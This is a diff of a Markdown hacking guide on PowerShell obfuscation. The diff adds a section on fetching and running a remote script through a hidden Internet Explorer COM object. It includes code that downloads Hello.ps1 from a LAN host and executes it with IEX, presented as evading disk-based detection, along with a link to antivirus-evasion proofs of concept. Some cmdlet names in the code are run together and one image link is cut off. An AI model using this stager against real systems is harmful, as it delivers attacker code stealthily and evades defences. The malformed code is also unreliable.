@@ -611,7 +611,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-      [ BitsTransfer ]
+      [ BitsTransfer - Additional Methods for Remote Download ]
       Another way to download/execute remotelly our agent without using the powershell switch
       (Net.WebClient).DownloadFile method. This method also allow us to chose the download
       location of the agent in target system and start the agent (exe).
@@ -631,6 +631,26 @@ The above string can be obfuscated using **powershell special characters:** **`*
 - Execution of **agent.exe** in target system (auto-exec)
 
 ![powershell obfuscation msfconsole](http://i.cubeupload.com/CYNBc6.jpg)
+
+---
+
+      TODO: [ ComInternetExplorer - Additional Methods for Remote Download ]
+      IExplore is potentially the cleanest method. Nothing hits disk, blends in 
+      with regular user browsing activity, and uses target system’s User Agent.
+
+<br />
+
+- File **test.ps1** (trigger download/execution)
+
+      $url = "http://192.168.1.71/Hello.ps1"
+      $objIE = New-Object-ComInternetExplorer.Application
+        While($objIE.Busy) {Start-Sleep-Seconds1}
+          $objIE.Visible = $false
+            $objIE.Navigate($url)
+            While($objIE.Busy) {Start-Sleep-Seconds1}
+      IEX $objIE.Document.Body.InnerText;Hello
+
+![powershell obfuscation Hello.ps1](http://i.)
 
 ---
 
@@ -820,6 +840,7 @@ Here we can view the all process of encoding/decoding in powershell console
       }
 
 [0] [Glosario](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md#glosario)<br />
+[1] [avepoc - some pocs for antivirus evasion](https://github.com/govolution/avepoc)<br />
 
 ---
 
@@ -879,7 +900,7 @@ Here we can view the all process of encoding/decoding in powershell console
            $encodeString=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($encode))
 
       3ª - Display/Copy the reObfuscated base64 string
-           Write-Host "Encoded syscall:" $encodeString -ForeGroundColor Green
+           Write-Host "Encoded syscall:" $encodeString -ForeGroundColor Green -BackGroundColor black
 
 ![powershell obfuscation](http://i.cubeupload.com/L4hMrt.jpg)
 
